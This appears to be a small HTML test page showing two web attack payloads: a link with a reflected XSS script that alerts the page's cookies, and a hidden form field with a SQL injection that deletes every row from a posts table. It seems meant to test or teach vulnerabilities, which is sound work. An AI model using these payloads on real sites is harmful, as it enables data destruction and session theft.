<body>
<p><a href="/?msg=%3Cscript%3Ealert(document.cookie);%3C/script%3E">XSS</a></p>

<p>SQL Injection</p>
<form action="/" method="post">
    <input type="hidden" name="delete[id]" value="0';delete from posts where 0 = 0;--">
    <input type="submit" value="submit">
</form>
</body>
